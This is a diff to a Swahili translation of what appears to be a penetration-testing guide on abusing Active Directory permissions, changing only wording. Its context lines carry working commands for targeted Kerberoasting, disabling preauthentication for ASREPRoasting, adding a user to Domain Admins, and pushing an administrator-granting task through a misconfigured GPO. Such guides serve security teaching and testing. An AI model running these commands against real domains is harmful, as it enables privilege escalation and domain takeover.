@@ -15,15 +15,15 @@ Set-DomainObject -Credential $creds -Identity <username> -Set @{serviceprincipal
 .\Rubeus.exe kerberoast /user:<username> /nowrap
 Set-DomainObject -Credential $creds -Identity <username> -Clear serviceprincipalname -Verbose
 ```
-- **Targeted ASREPRoasting**: Zima uthibitisho wa awali kwa mtumiaji, na kufanya akaunti yao kuwa hatarini kwa ASREPRoasting.
+- **Targeted ASREPRoasting**: Zima awali ya uthibitisho kwa mtumiaji, ikifanya akaunti yao kuwa hatarini kwa ASREPRoasting.
 ```powershell
 Set-DomainObject -Identity <username> -XOR @{UserAccountControl=4194304}
 ```
-## **GenericAll Haki Kwenye Kundi**
+## **GenericAll Rights on Group**
 
-Haki hii inamruhusu mshambuliaji kubadilisha uanachama wa kundi ikiwa wana haki za `GenericAll` kwenye kundi kama `Domain Admins`. Baada ya kubaini jina la kipekee la kundi kwa kutumia `Get-NetGroup`, mshambuliaji anaweza:
+Haki hii inaruhusu mshambuliaji kubadilisha uanachama wa kikundi ikiwa wana haki za `GenericAll` kwenye kikundi kama `Domain Admins`. Baada ya kubaini jina la kipekee la kikundi kwa kutumia `Get-NetGroup`, mshambuliaji anaweza:
 
-- **Kujiongeza Kwenye Kundi la Domain Admins**: Hii inaweza kufanywa kupitia amri za moja kwa moja au kutumia moduli kama Active Directory au PowerSploit.
+- **Kujiongeza kwenye Kikundi cha Domain Admins**: Hii inaweza kufanywa kupitia amri za moja kwa moja au kutumia moduli kama Active Directory au PowerSploit.
 ```powershell
 net group "domain admins" spotless /add /domain
 Add-ADGroupMember -Identity "domain admins" -Members spotless
@@ -31,28 +31,28 @@ Add-NetGroupUser -UserName spotless -GroupName "domain admins" -Domain "offense.
 ```
 ## **GenericAll / GenericWrite / Write on Computer/User**
 
-Kuwa na haki hizi kwenye kitu cha kompyuta au akaunti ya mtumiaji kunaruhusu:
+Kuwa na haki hizi kwenye kituo cha kompyuta au akaunti ya mtumiaji kunaruhusu:
 
-- **Kerberos Resource-based Constrained Delegation**: Inaruhusu kuchukua udhibiti wa kitu cha kompyuta.
+- **Kerberos Resource-based Constrained Delegation**: Inaruhusu kuchukua udhibiti wa kituo cha kompyuta.
 - **Shadow Credentials**: Tumia mbinu hii kuiga kompyuta au akaunti ya mtumiaji kwa kutumia haki za kuunda shadow credentials.
 
 ## **WriteProperty on Group**
 
 Ikiwa mtumiaji ana haki za `WriteProperty` kwenye vitu vyote kwa kundi maalum (mfano, `Domain Admins`), wanaweza:
 
-- **Add Themselves to the Domain Admins Group**: Inaweza kufanywa kwa kuunganisha amri za `net user` na `Add-NetGroupUser`, mbinu hii inaruhusu kupandisha hadhi ndani ya eneo.
+- **Kujiongeza Kwenye Kundi la Domain Admins**: Inaweza kufanywa kwa kuunganisha amri za `net user` na `Add-NetGroupUser`, mbinu hii inaruhusu kupandishwa vyeo ndani ya eneo.
 ```powershell
 net user spotless /domain; Add-NetGroupUser -UserName spotless -GroupName "domain admins" -Domain "offense.local"; net user spotless /domain
 ```
 ## **Self (Self-Membership) on Group**
 
-Haki hii inawawezesha washambuliaji kujiongeza kwenye vikundi maalum, kama `Domain Admins`, kupitia amri zinazoshughulikia uanachama wa kundi moja kwa moja. Kutumia mfuatano wa amri zifuatazo kunaruhusu kujiongeza:
+Haki hii inawawezesha washambuliaji kujiongeza kwenye vikundi maalum, kama `Domain Admins`, kupitia amri zinazoshughulikia uanachama wa kundi moja kwa moja. Kutumia mfuatano wa amri zifuatazo kunaruhusu kujiongeza mwenyewe:
 ```powershell
 net user spotless /domain; Add-NetGroupUser -UserName spotless -GroupName "domain admins" -Domain "offense.local"; net user spotless /domain
 ```
 ## **WriteProperty (Self-Membership)**
 
-Haki kama hii, inawawezesha washambuliaji kujiongeza moja kwa moja kwenye vikundi kwa kubadilisha mali za kikundi ikiwa wana haki ya `WriteProperty` kwenye vikundi hivyo. Uthibitisho na utekelezaji wa haki hii hufanywa kwa:
+Haki inayofanana, hii inawawezesha washambuliaji kujiongeza moja kwa moja kwenye vikundi kwa kubadilisha mali za kikundi ikiwa wana haki ya `WriteProperty` kwenye vikundi hivyo. Uthibitisho na utekelezaji wa haki hii hufanywa kwa:
 ```powershell
 Get-ObjectAcl -ResolveGUIDs | ? {$_.objectdn -eq "CN=Domain Admins,CN=Users,DC=offense,DC=local" -and $_.IdentityReference -eq "OFFENSE\spotless"}
 net group "domain admins" spotless /add /domain
@@ -126,7 +126,7 @@ Ili kubaini GPO zilizo na mipangilio isiyo sahihi, cmdlets za PowerSploit zinawe
 
 ### Abuse GPO - New-GPOImmediateTask
 
-GPO zilizo na mipangilio isiyo sahihi zinaweza kutumika vibaya kutekeleza msimbo, kwa mfano, kwa kuunda kazi ya ratiba ya haraka. Hii inaweza kufanywa kuongeza mtumiaji kwenye kundi la wasimamizi wa ndani kwenye mashine zilizoathiriwa, ikiongeza sana ruhusa:
+GPO zilizo na mipangilio isiyo sahihi zinaweza kutumika vibaya kutekeleza msimbo, kwa mfano, kwa kuunda kazi ya ratiba ya papo hapo. Hii inaweza kufanywa kuongeza mtumiaji kwenye kundi la wasimamizi wa ndani kwenye mashine zilizoathiriwa, ikiongeza sana ruhusa:
 ```powershell
 New-GPOImmediateTask -TaskName evilTask -Command cmd -CommandArguments "/c net localgroup administrators spotless /add" -GPODisplayName "Misconfigured Policy" -Verbose -Force
 ```
@@ -145,13 +145,13 @@ SharpGPOAbuse inatoa njia ya kutumia GPO zilizopo kwa kuongeza kazi au kubadilis
 ```
 ### Force Policy Update
 
-GPO updates kwa kawaida hufanyika kila dakika 90. Ili kuharakisha mchakato huu, hasa baada ya kutekeleza mabadiliko, amri ya `gpupdate /force` inaweza kutumika kwenye kompyuta lengwa ili kulazimisha sasisho la sera mara moja. Amri hii inahakikisha kwamba mabadiliko yoyote kwenye GPOs yanatumika bila kusubiri mzunguko wa sasisho la moja kwa moja unaofuata.
+GPO updates kawaida hufanyika kila dakika 90. Ili kuharakisha mchakato huu, hasa baada ya kutekeleza mabadiliko, amri ya `gpupdate /force` inaweza kutumika kwenye kompyuta lengwa ili kulazimisha sasisho la sera mara moja. Amri hii inahakikisha kwamba mabadiliko yoyote kwenye GPOs yanatumika bila kusubiri mzunguko wa sasisho la moja kwa moja unaofuata.
 
 ### Under the Hood
 
-Wakati wa ukaguzi wa Kazi za Ratiba kwa GPO fulani, kama vile `Misconfigured Policy`, ongezeko la kazi kama `evilTask` linaweza kuthibitishwa. Kazi hizi zinaundwa kupitia scripts au zana za amri zikiwa na lengo la kubadilisha tabia ya mfumo au kuongeza mamlaka.
+Wakati wa ukaguzi wa Kazi za Ratiba kwa GPO fulani, kama vile `Misconfigured Policy`, kuongeza kazi kama `evilTask` kunaweza kuthibitishwa. Kazi hizi zinaundwa kupitia skripti au zana za amri zikiwa na lengo la kubadilisha tabia ya mfumo au kuongeza mamlaka.
 
-Muundo wa kazi, kama inavyoonyeshwa katika faili ya usanifu wa XML iliyozalishwa na `New-GPOImmediateTask`, inaelezea maelezo ya kazi iliyopangwa - ikiwa ni pamoja na amri itakayotekelezwa na vichocheo vyake. Faili hii inawakilisha jinsi kazi zilizopangwa zinavyofafanuliwa na kusimamiwa ndani ya GPOs, ikitoa njia ya kutekeleza amri au scripts za kiholela kama sehemu ya utekelezaji wa sera.
+Muundo wa kazi, kama inavyoonyeshwa katika faili ya usanifu wa XML iliyozalishwa na `New-GPOImmediateTask`, inaelezea maelezo ya kazi iliyopangwa - ikiwa ni pamoja na amri itakayotekelezwa na vichocheo vyake. Faili hii inawakilisha jinsi kazi zilizopangwa zinavyofafanuliwa na kusimamiwa ndani ya GPOs, ikitoa njia ya kutekeleza amri au skripti za kiholela kama sehemu ya utekelezaji wa sera.
 
 ### Users and Groups
 
@@ -159,7 +159,7 @@ GPOs pia zinaruhusu kubadilisha uanachama wa watumiaji na vikundi kwenye mifumo 
 
 Faili ya usanifu wa XML kwa Watumiaji na Vikundi inaelezea jinsi mabadiliko haya yanavyotekelezwa. Kwa kuongeza entries kwenye faili hii, watumiaji maalum wanaweza kupewa mamlaka ya juu kwenye mifumo iliyoathiriwa. Njia hii inatoa njia ya moja kwa moja ya kuongeza mamlaka kupitia kubadilisha GPO.
 
-Zaidi ya hayo, mbinu za ziada za kutekeleza msimbo au kudumisha kudumu, kama vile kutumia scripts za kuingia/kuondoka, kubadilisha funguo za rejista kwa ajili ya autoruns, kufunga programu kupitia faili za .msi, au kuhariri usanifu wa huduma, zinaweza pia kuzingatiwa. Mbinu hizi zinatoa njia mbalimbali za kudumisha ufikiaji na kudhibiti mifumo lengwa kupitia matumizi mabaya ya GPOs.
+Zaidi ya hayo, mbinu za ziada za kutekeleza msimbo au kudumisha kudumu, kama vile kutumia skripti za kuingia/kuondoka, kubadilisha funguo za rejista kwa ajili ya kuanzisha kiotomatiki, kufunga programu kupitia faili za .msi, au kuhariri usanifu wa huduma, zinaweza pia kuzingatiwa. Mbinu hizi zinatoa njia mbalimbali za kudumisha ufikiaji na kudhibiti mifumo lengwa kupitia matumizi mabaya ya GPOs.
 
 ## References
 
